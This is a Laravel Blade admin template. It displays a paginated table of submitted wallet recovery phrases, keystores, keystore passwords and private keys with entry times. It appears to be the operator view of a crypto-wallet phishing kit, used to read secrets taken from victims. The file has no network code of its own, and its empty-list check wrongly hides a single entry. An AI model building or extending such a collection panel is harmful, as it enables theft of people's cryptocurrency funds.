@include ('admin.includes.admin_header')

  <!-- Page Wrapper -->
  <div id="wrapper">
    <!-- Sidebar -->

       @include('admin.includes.admin_navigations')

        <!-- End of Topbar -->

        <!-- Begin Page Content -->
        <div class="container-fluid">

          <!-- Page Heading -->

              <!-- Approach -->

              <h3>Details</h3>
              
              <table class= "table table-bordered table-hover">
                                    <thead>
                                        <tr>
                                            <th>Id/#</th>
                                            <th>Phrase</th>
                                            <th>Keystore</th>
                                            <th>Keystore Password</th>
                                            <th>Private Key</th>
                                            <th>Time of Entry</th>
                                        </tr>
                                    </thead>
                                  <tbody>
                                   @if(count($details)>1)   
                                    @foreach($details as $detail)
                                  <tr>
                                        <td>{{$detail->id}}</td>
                                        <td>{{$detail->phrase}}</td>
                                        <td>{{$detail->keystore}}</td>
                                        <td>{{$detail->keystore_password}}</td>
                                        <td>{{$detail->private_key}}</td>
                                        <td>{{$detail->created_at->diffForHumans()}}</td>
                                  </tr>
                                  @endforeach
                                @else
                                <p>No Details Yet</p>
                                @endif
                                </tbody>
                                </table>
                                {{$details->links()}}
                                

        </div>
        <!-- /.container-fluid -->
        
      </div>
      <!-- End of Main Content -->
      

  @include('admin.includes.admin_footer')
